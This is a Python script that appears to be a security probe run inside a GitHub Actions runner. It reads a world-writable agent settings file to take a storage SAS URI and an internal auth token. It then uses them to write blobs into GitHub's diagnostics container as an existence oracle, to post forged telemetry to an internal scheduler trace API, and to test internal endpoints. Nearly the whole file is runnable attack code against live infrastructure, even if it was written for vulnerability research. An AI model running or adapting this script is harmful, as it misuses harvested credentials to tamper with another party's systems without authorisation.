#!/usr/bin/env python3
"""U6 probe9 - sharpen: write-oracle on GitHub's diag storage + internal trace API."""
import base64
import json
import os
import subprocess
import urllib.error
import urllib.request

LINE = "=" * 72
OUT = []


def hdr(t):
    OUT.append("\n" + LINE + "\n## " + t + "\n" + LINE)


def sh(cmd, timeout=30):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (p.stdout + p.stderr).strip()
    except Exception as e:  # noqa: BLE001
        return "EXC: %r" % (e,)


def http(url, headers=None, timeout=25, method="GET", data=None):
    req = urllib.request.Request(url, headers=headers or {}, method=method, data=data)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read(3000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), e.read(1500).decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return "ERR", {}, repr(e)


cfg = json.loads(open("/opt/hca/.settings", "rb").read())
sas = cfg["diagnosticsSasUri"]
container, q = sas.split("?", 1)
run_id = os.environ.get("GITHUB_RUN_ID", "x")

hdr("1. exact permission evidence on the file")
OUT.append(sh("ls -l /opt/hca/.settings"))
OUT.append(sh("getfacl -p /opt/hca/.settings 2>/dev/null || stat -f '%Sp %Su:%Sg' /opt/hca/.settings"))
OUT.append("os.access(R_OK)=%s   os.access(W_OK)=%s" % (
    os.access("/opt/hca/.settings", os.R_OK), os.access("/opt/hca/.settings", os.W_OK)))
OUT.append("readable by an unprivileged OTHER user? mode 666 => yes (all three rw bits set)")

hdr("2. write-oracle: does a named blob already exist in GitHub's diag container?")
OUT.append("technique: PUT with If-None-Match:* and x-ms-blob-type => 201 created / 412 already there")


def put_if_absent(name, payload=b"u6 probe\n"):
    st, h, b = http(container + "/" + name + "?" + q,
                    {"x-ms-blob-type": "BlockBlob", "Content-Type": "text/plain",
                     "If-None-Match": "*"},
                    method="PUT", data=payload)
    return st, h, b


for nm in ("u6-oracle-%s.txt" % run_id, "hosted-compute-agent.log", "diagnostics.json",
           "hca.log", "trace.json", "agent.log"):
    st, h, b = put_if_absent(nm)
    OUT.append("  PUT %-34s -> %s %s" % (nm, st, "CREATED" if st == 201 else
                                         ("EXISTS" if st == 412 else b[:110].replace("\n", " "))))

hdr("3. the write credential outlives the build: it is scoped to wall-clock, not to the job")
params = dict(p.split("=", 1) for p in q.split("&"))
OUT.append("signed start   st = %s" % params.get("st"))
OUT.append("signed expiry  se = %s" % params.get("se"))
OUT.append("key expiry     ske= %s" % params.get("ske"))
OUT.append("signed perms   sp = %s  (a=add c=create w=write; no r, no l => write-only)" % params.get("sp"))
OUT.append("signed resource sr = %s (container scope)" % params.get("sr"))
OUT.append("signed version sv = %s" % params.get("sv"))

hdr("4. GitHub's INTERNAL trace API - can a build step post into it?")
base = cfg["schedulerApiUrl"].rstrip("/")
OUT.append("schedulerApiUrl = %s" % base)
tok = cfg["authToken"]
payload = json.dumps([{
    "name": "u6.probe", "dimensions": {"run": run_id},
    "value": 1, "type": "distribution_ms",
}]).encode()
for path in ("/trace", "/"):
    for authn, hdrv in (("Authorization-Bearer", "Bearer " + tok),
                        ("X-GitHub-Token", tok),
                        ("Authorization", tok)):
        st, h, b = http(base + path, {authn: hdrv, "Content-Type": "application/json"},
                        method="POST", data=payload)
        OUT.append("  POST %-8s %-22s -> %s %s" % (path, authn, st, b[:140].replace("\n", " ")))

hdr("5. is the HCA token accepted as a bearer for the /v1 (non-/vm) surface?")
for path in ("/trace", "/metrics", "/health", "/status", "/v1/trace"):
    st, h, b = http(base + path, {"Authorization": "Bearer " + tok})
    OUT.append("  GET %-12s -> %s %s" % (path, st, b[:120].replace("\n", " ")))

hdr("6. confirm from this run: put + report the request id for independent verification")
name = "u6-verify-%s.txt" % run_id
st, h, b = http(container + "/" + name + "?" + q,
                {"x-ms-blob-type": "BlockBlob", "Content-Type": "text/plain"},
                method="PUT", data=b"u6 verification blob\n")
OUT.append("PUT %s -> %s reqid=%s etag=%s" % (name, st, h.get("x-ms-request-id"), h.get("ETag")))
OUT.append("container=%s account=%s" % (container.split("/")[3], container.split("/")[2]))

text = "\n".join(OUT)
print(text)
